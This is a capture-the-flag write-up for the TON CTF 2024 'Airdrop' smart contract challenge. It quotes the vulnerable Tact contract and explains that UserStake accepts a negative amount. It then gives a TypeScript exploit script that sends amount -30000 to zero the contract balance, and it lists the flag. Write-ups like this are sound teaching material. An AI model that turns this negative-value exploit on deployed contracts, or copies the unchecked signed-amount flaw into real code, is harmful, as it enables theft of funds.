---
title: Blockchain - Airdrop
description: 2024 | TON CTF
tags:
    - ton
    - tact
---

## Description

> [Challenge Files](https://github.com/TonBitSec/TonCTF-Challenges/tree/6dc2518086f88006a4dd4dd0bfef963b1f13c33b/airdrop)

??? note "Airdrop.tact[^dup]"

    ```rs
    const CLAIM_AMOUNT: Int = 1;
    const INIT_SUPPLY: Int = 30000;

    message UserStake{
        amount: Int;
    }

    message UserWithdraw{
        amount: Int;
    }

    message StakeEvent{
        sender: Address;
        amount: Int;
    }

    contract AirDrop {

        total_balance: Int as uint256;
        user_info: map<Address, Int>;
        user_claim_info: map<Address, Bool>;

        init(version: Int) {
            self.user_info = emptyMap();
            self.total_balance = INIT_SUPPLY;
        }

        receive("AirDrop") {
            require(self.user_claim_info.get(sender()) == null, "Have claimed");
            let user_staked: Int = 0;
            if (self.user_info.get(sender()) != null) {
                user_staked = self.user_info.get(sender())!!;
            }
            self.total_balance = self.total_balance - CLAIM_AMOUNT;
            self.user_info.set(sender(), user_staked + CLAIM_AMOUNT);
            self.user_claim_info.set(sender(), true);
        }

        receive(msg: UserStake) {
            require(context().value > msg.amount, "Incorrect TON value");
            let user_staked: Int = 0;
            if (self.user_info.get(sender()) != null) {
                user_staked = self.user_info.get(sender())!!;
            }
            self.total_balance = self.total_balance + msg.amount;
            self.user_info.set(sender(), user_staked + msg.amount);
        }

        receive(msg: UserWithdraw) {
            require(self.user_info.get(sender()) != null && self.user_info.get(sender())!! != 0, "Nothing to withdraw");
            let user_staked: Int = 0;
            user_staked = self.user_info.get(sender())!!;
            require(msg.amount <= user_staked, "Insufficient balance");
            self.total_balance = self.total_balance - msg.amount;
            if (msg.amount == user_staked) {
                self.user_info.del(sender());
            } else {
                self.user_info.set(sender(), user_staked - msg.amount);
            }
        }

        get fun balance(): Int {
            return self.total_balance;
        }

        get fun is_solved(): Bool {
            return self.total_balance == 0;
        }
    }
    ```

## Solution

- There is a state variable `total_balance` with value `30000` initially. The goal of this challenge is to make `total_balance` equal to zero
- There are three operations:
    - **AirDrop** Each user can execute once and `total_balance` will be subtracted by 1.
    - **UserStake** Increase `total_balance` and `user_staked` with user-provided `msg.amount`.
    - **UserWithdraw** Decrease `total_balance` and `user_staked` with user-provided `msg.amount`. The `msg.amount` should not be greater than `user_staked`.
- Since `UserStake` does not check `msg.amount` which is of type `Int`, we can provide a negative value to reduce `total_balance`

    ```rs
    receive(msg: UserStake) {
        require(context().value > msg.amount, "Incorrect TON value");
        let user_staked: Int = 0;
        if (self.user_info.get(sender()) != null) {
            user_staked = self.user_info.get(sender())!!;
        }
        self.total_balance = self.total_balance + msg.amount;
        self.user_info.set(sender(), user_staked + msg.amount);
    }
    ```

### Exploitation

Create a `solve.ts` under the `sources/` and run `yarn solve`.

```ts
import { Address, toNano, TonClient, WalletContractV4 } from "@ton/ton";
import { mnemonicToPrivateKey } from "ton-crypto";
import { AirDrop } from "./output/Airdrop_AirDrop";
import * as dotenv from "dotenv";
dotenv.config();

(async () => {
    const client = new TonClient({
        endpoint: "http://65.21.223.95:8081/jsonRPC",
    });

    let mnemonics = (process.env.mnemonics_2 || "").toString();
    console.log(mnemonics);

    let keyPair = await mnemonicToPrivateKey(mnemonics.split(" "));
    let secretKey = keyPair.secretKey;
    let workchain = 0; // we are working in basechain.
    let deployer_wallet = WalletContractV4.create({ workchain, publicKey: keyPair.publicKey });
    console.log(deployer_wallet.address);

    let deployer_wallet_contract = client.open(deployer_wallet);

    let target = Address.parse(CONTRACT);

    let contract_open = await client.open(AirDrop.fromAddress(target));
    await contract_open.send(
        deployer_wallet_contract.sender(secretKey),
        {
            // deducting fees from it
            value: toNano("0.1"),
        },
        {
            "$$type": "UserStake",
            "amount": -30000n,
        }
    );
})();
```

### Flag

> flag{9uhaXCAoWxGi}_Airdrop

## References

- [TonBitSec / ton-sample](https://github.com/TonBitSec/ton-sample/tree/054915e9f0655d39e60d0b6740692615da37e023/sources)

[^dup]: The `init` function adds a `version` parameter to avoid instance contracts having the same address.
